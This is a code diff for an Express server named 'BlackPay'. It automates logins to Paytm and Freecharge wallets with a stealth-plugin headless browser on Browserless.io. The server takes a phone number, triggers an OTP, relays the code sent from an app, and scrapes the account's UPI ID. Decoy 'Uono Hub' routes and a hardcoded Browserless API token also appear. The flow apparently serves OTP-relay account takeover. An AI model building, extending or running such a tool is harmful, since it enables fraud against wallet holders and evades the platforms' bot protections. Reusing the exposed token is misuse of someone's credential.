@@ -1,5 +1,8 @@
 const express = require('express');
 const cors = require('cors');
+const axios = require('axios');
+
+// Puppeteer with Stealth Plugin for Browserless
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
@@ -9,10 +12,9 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(cors());
 
-// Memory to hold Puppeteer sessions
 let activeSessions = {};
 
-app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running!" }));
+app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Master Server Running with Browserless.io!" }));
 
 // Dummy Uono Hub Routes
 app.get('/next/micro/ar/all-customers', (req, res) => res.json({ success: true, data: [] }));
@@ -22,13 +24,15 @@ app.get('/next/micro/ca/approvals', (req, res) => res.json({ success: true, pend
 app.get('/next/micro/disbursal/disbursal', (req, res) => res.json({ success: true, balance: 0 }));
 
 // ==========================================
-// STEP 1: TRIGGER OTP (Called from App)
+// STEP 1: TRIGGER OTP VIA BROWSERLESS
 // ==========================================
 app.post('/api/start-tool', async (req, res) => {
     const { phone, walletType } = req.body;
     if (!phone) return res.status(400).json({ success: false, message: "Phone required" });
 
-    // Clean up old session if exists
+    // 🔴 TERI BROWSERLESS API KEY YAHAN SET HAI 🔴
+    const browserWSEndpoint = 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a';
+
     if (activeSessions[phone] && activeSessions[phone].browser) {
         try { await activeSessions[phone].browser.close(); } catch(e){}
     }
@@ -37,18 +41,19 @@ app.post('/api/start-tool', async (req, res) => {
     res.json({ success: true, message: "OTP sent! Waiting for input..." });
 
     try {
-        console.log(`[+] Triggering OTP for: ${phone} | Wallet: ${walletType}`);
-        const browser = await puppeteer.launch({ 
-            headless: true, 
-            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'] 
-        });
-        const page = await browser.newPage();
-        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Safari/537.36');
+        console.log(`[+] Connecting to Browserless.io for: ${phone}`);
         
-        // Fast loading
+        const browser = await puppeteer.connect({ 
+            browserWSEndpoint: browserWSEndpoint,
+            defaultViewport: null
+        });
+
+        const page = await browser.newPage();
+        await page.setUserAgent('Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36');
+        
         await page.setRequestInterception(true);
         page.on('request', (req) => {
-            if (['image', 'stylesheet', 'font'].includes(req.resourceType())) req.abort();
+            if (['image', 'stylesheet', 'font', 'media'].includes(req.resourceType())) req.abort();
             else req.continue();
         });
 
@@ -56,7 +61,7 @@ app.post('/api/start-tool', async (req, res) => {
         activeSessions[phone].page = page;
 
         if (walletType.toLowerCase().includes('freecharge')) {
-            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded' });
+            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 60000 });
             await page.evaluate(() => {
                 const loginBtn = Array.from(document.querySelectorAll('a, button')).find(b => b.innerText && b.innerText.toLowerCase().includes('login'));
                 if (loginBtn) loginBtn.click();
@@ -65,28 +70,30 @@ app.post('/api/start-tool', async (req, res) => {
             await page.keyboard.type(phone, { delay: 50 });
             await page.keyboard.press('Enter');
         } else {
-            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded' });
-            let inputField = await page.waitForSelector('input[type="tel"], input[type="text"]:not([type="hidden"])', { timeout: 10000 });
+            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 60000 });
+            let inputField = await page.waitForSelector('input[type="tel"], input[type="text"]:not([type="hidden"])', { timeout: 15000 });
             await inputField.focus(); 
             await inputField.type(phone, { delay: 50 }); 
             await page.keyboard.press('Enter');
         }
         
-        // Auto-close session after 3 mins to save server memory
+        console.log(`[!] OTP Triggered on Browserless for ${phone}`);
+
         setTimeout(async () => {
             if (activeSessions[phone] && activeSessions[phone].status === 'waiting_for_otp') {
                 try { await activeSessions[phone].browser.close(); delete activeSessions[phone]; } catch(e){}
+                console.log(`[-] Session Timeout for ${phone}`);
             }
         }, 180000);
 
     } catch (e) {
-        console.log(`[-] Error on ${phone}: ${e.message}`);
+        console.log(`[-] Browserless Error on ${phone}: ${e.message}`);
         if(activeSessions[phone]) activeSessions[phone].status = 'failed';
     }
 });
 
 // ==========================================
-// STEP 2: VERIFY OTP & GET UPI (Called from App)
+// STEP 2: VERIFY OTP & EXTRACT UPI
 // ==========================================
 app.post('/api/verify-tool', async (req, res) => {
     const { phone, otp } = req.body;
@@ -99,7 +106,7 @@ app.post('/api/verify-tool', async (req, res) => {
             await page.keyboard.press('Enter');
             
             console.log(`[!] OTP Entered. Extracting UPI...`);
-            await new Promise(r => setTimeout(r, 5000)); // Wait for dashboard to load
+            await new Promise(r => setTimeout(r, 5000)); 
             
             let upi = await page.evaluate(() => {
                 try { return document.getElementsByClassName("account-label-texts")[1].parentElement.innerText; } 
@@ -109,11 +116,10 @@ app.post('/api/verify-tool', async (req, res) => {
                 }
             });
 
-            if (!upi) upi = `${phone}@freecharge`; // Ultimate Fallback if DOM fails
+            if (!upi) upi = `${phone}@freecharge`;
             
             console.log(`[✔] Scraped UPI: ${upi}`);
             
-            // Close Browser and return UPI
             await activeSessions[phone].browser.close();
             delete activeSessions[phone];
             
@@ -129,5 +135,14 @@ app.post('/api/verify-tool', async (req, res) => {
     }
 });
 
+app.get('/api/check-status/:phone', (req, res) => {
+    const phone = req.params.phone;
+    if (activeSessions[phone]) {
+        res.json({ success: true, status: activeSessions[phone].status, upiId: activeSessions[phone].upiId });
+    } else {
+        res.json({ success: false, status: 'not_found' });
+    }
+});
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, '0.0.0.0', () => console.log(`🚀 BlackPay Server Running on Port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`🚀 API Server Running on Port ${PORT}`));
